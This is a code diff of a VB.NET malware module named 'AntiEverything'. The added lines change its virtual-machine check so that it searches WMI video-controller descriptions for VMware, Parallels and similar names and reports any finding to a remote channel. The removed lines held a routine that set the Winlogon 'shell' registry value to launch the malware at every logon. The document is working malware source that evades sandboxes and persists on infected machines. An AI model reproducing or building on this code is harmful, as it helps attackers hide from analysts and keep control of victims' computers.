@@ -21,12 +21,12 @@ Module AntiEverything
         On Error Resume Next
 
         If Not IO.File.Exists(IO.Path.GetTempPath & "microsoft.ini") Then
-            AntiVM()
+            searchVM()
         End If
 
     End Sub
 
-    Public Function AntiVM() As String
+    Public Function SearchVM() As String 'Virtual Mashine finder
         Try
             Dim searcher As New ManagementObjectSearcher("root\CIMV2", "SELECT * FROM Win32_VideoController")
             Dim str As String = String.Empty
@@ -34,20 +34,11 @@ Module AntiEverything
             For Each obj2 In searcher.Get
                 str = Convert.ToString(obj2.Item("Description"))
                 Dim Search As String = StrConv(str, VbStrConv.Lowercase)
-                If Search.Contains("virtual") Then AntisFound()
-                If Search.Contains("vmware") Then AntisFound()
-                If Search.Contains("parallels") Then AntisFound()
-                If Search.Contains("vm additions") Then AntisFound()
+                If Search.Contains("virtual") Then TalktoChannel("Finded Virtual mashine: ", "Virtual")
+                If Search.Contains("vmware") Then TalktoChannel("Finded Virtual mashine: ", "VMware")
+                If Search.Contains("parallels") Then TalktoChannel("Finded Virtual mashine: ", "Parallels")
+                If Search.Contains("vm additions") Then TalktoChannel("Finded Virtual mashine: ", "VM Additions")
             Next
         Catch : End Try
     End Function
-
-    Public Sub AntisFound()
-        On Error Resume Next
-        WhatToRun = ""
-        Dim Fuckyou As RegistryKey
-        Fuckyou = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", True)
-        Fuckyou.SetValue("shell", "explorer.exe," & """" & Application.ExecutablePath & """")
-        Fuckyou.Close()
-    End Sub
 End Module
